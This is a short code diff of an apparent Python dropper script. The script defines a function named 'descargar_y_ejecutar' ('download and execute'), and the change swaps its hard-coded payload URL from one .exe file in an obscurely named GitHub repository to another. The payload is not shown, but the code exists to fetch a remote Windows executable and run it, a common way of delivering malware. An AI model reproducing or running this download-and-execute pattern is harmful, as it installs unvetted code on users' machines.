@@ -6,8 +6,8 @@ import subprocess
 import sys
 import shutil
 
-URL  = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui.exe"
-NAME = "dikdui.exe"
+URL  = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui2.exe"
+NAME = "dikdui2.exe"
 
 
 def descargar_y_ejecutar():
